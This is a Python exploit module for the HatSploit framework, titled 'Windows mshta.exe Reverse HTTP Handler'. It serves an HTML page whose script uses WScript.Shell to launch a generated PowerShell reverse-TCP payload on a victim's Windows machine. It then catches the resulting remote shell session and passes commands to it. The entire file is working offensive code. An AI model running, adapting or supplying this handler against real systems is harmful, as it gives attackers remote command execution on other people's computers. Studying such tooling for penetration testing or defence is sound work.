#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module

from hatsploit.lib.handle import Handle
from hatsploit.lib.payloads import Payloads
from hatsploit.lib.handler import Handler


class HatSploitModule(Module, Handle, Payloads, Handler):
    details = {
        'Category': "exploit",
        'Name': "Windows mshta.exe Reverse HTTP Handler",
        'Module': "exploit/windows/handler/mshta_reverse_http",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Windows mshta.exe reverse HTTP handler.",
        'Platform': "windows",
        'Rank': "high"
    }

    payload = {
        'Value': "windows/generic/powershell_reverse_tcp",
        'Architectures': None,
        'Platforms': [
            'windows'
        ],
        'Types': None,
        'Handler': 'reverse_tcp'
    }

    options = {
        'SRVHOST': {
            'Description': "Local host to start HTTP server on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Local port to start HTTP server on.",
            'Value': 8080,
            'Type': "port",
            'Required': True
        },
        'URLPATH': {
            'Description': "File path on server.",
            'Value': "/",
            'Type': None,
            'Required': True
        }
    }

    def serve_mshta(self, server_host, server_port, url_path):
        payload = self.generate_payload(
            "windows/generic/powershell_reverse_tcp", {
                'RHOST': self.handler['RHOST'],
                'RPORT': self.handler['RPORT']
            }
        )['Payload']

        def get(request):
            if request.path == url_path:
                self.print_process("Delivering payload...")

                request.send_response(200)
                request.send_header("Content-type", "text/html")
                request.end_headers()

                request.wfile.write(
                    (
                        "<html>\n"
                        "   <head>\n"
                        "       <script>\n"
                        f"          new ActiveXObject(\"WScript.Shell\").Run(\"{payload}\");\n"
                        "           self.close();\n"
                        "       </script>\n"
                        "   </head>\n"
                        "</html>\n"
                    ).encode()
                )

        self.listen_server(server_host, server_port, {'GET': get})

    def run(self):
        server_host, server_port, url_path = self.parse_options(self.options)
        self.background(self.serve_mshta, [server_host, server_port, url_path])

        remote = self.module_handle_session(
            self.payload['Handler']
        )

        if remote:
            self.module_handle(
                sender=remote[0].send_command
            )
            remote[0].close()
